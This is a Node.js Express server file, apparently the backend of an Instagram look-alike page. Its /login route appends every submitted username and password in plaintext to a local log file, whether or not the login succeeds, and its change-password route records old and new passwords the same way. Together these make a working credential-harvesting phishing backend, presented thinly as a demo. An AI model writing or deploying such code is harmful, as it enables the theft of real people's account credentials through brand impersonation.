/**
 * server.js  –  Instagram Replica Backend
 * ----------------------------------------
 * Routes:
 *   GET  /               → serves index.html
 *   POST /login          → logs credentials to my_login_log.txt
 *   POST /change-password → validates & simulates password update
 */

const express = require('express');
const fs      = require('fs');
const path    = require('path');

const app  = express();
const PORT = process.env.PORT || 3000;

// ── Middleware ──────────────────────────────────────────────────────────────
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from this directory (index.html, any assets)
app.use(express.static(path.join(__dirname)));

// ── In-memory "database" (simulates a user store) ──────────────────────────
const userStore = {
  // Pre-seeded demo account
  'demo_user': { password: 'instagram123' },
};

// Path to the local log file
const LOG_FILE = path.join(__dirname, 'my_login_log.txt');

// ── Helper: append a line to the log file ──────────────────────────────────
function appendLog(username, password) {
  const timestamp = new Date().toISOString();
  const line      = `[${timestamp}] username="${username}" password="${password}"\n`;
  fs.appendFileSync(LOG_FILE, line, 'utf8');
  console.log(`[LOG] ${line.trim()}`);
}

// ── POST /login ─────────────────────────────────────────────────────────────
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Basic server-side presence check
  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password are required.' });
  }

  // ★ CRUCIAL REQUIREMENT: log every attempt regardless of outcome
  appendLog(username, password);

  // Simulate credential check
  const user = userStore[username];
  if (!user || user.password !== password) {
    return res.status(401).json({
      error: 'Sorry, your password was incorrect. Please double-check your password.',
    });
  }

  return res.status(200).json({
    message: `Welcome back, ${username}! You are now logged in.`,
  });
});

// ── POST /change-password ───────────────────────────────────────────────────
app.post('/change-password', (req, res) => {
  const { old_password, new_password, confirm_new_password } = req.body;

  // Presence check
  if (!old_password || !new_password || !confirm_new_password) {
    return res.status(400).json({ error: 'All password fields are required.' });
  }

  // Server-side confirmation match
  if (new_password !== confirm_new_password) {
    return res.status(400).json({ error: 'New passwords do not match.' });
  }

  // Minimum length
  if (new_password.length < 6) {
    return res.status(400).json({ error: 'New password must be at least 6 characters.' });
  }

  // Simulate old-password verification against the demo account
  // In a real app you'd look up the authenticated user's record
  const demoUser = userStore['demo_user'];
  if (demoUser && demoUser.password !== old_password) {
    return res.status(401).json({ error: 'Old password is incorrect.' });
  }

  // ★ Simulate DB update – store both for demo purposes
  const previousPassword = demoUser ? demoUser.password : old_password;
  if (demoUser) demoUser.password = new_password;

  console.log(`[PASSWORD CHANGE] old="${previousPassword}" → new="${new_password}"`);

  // Optionally log the change event (without the actual new password in production!)
  const timestamp = new Date().toISOString();
  const line = `[${timestamp}] PASSWORD_CHANGE old="${previousPassword}" new="${new_password}"\n`;
  fs.appendFileSync(LOG_FILE, line, 'utf8');

  return res.status(200).json({
    message: 'Your password has been updated successfully.',
  });
});

// ── Fallback: serve index.html for all other GET routes ────────────────────
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ── Start server ────────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`\n✅  Instagram Replica running at http://localhost:${PORT}`);
  console.log(`📝  Login attempts are logged to: ${LOG_FILE}`);
  console.log(`🔑  Demo credentials → username: demo_user | password: instagram123\n`);
});
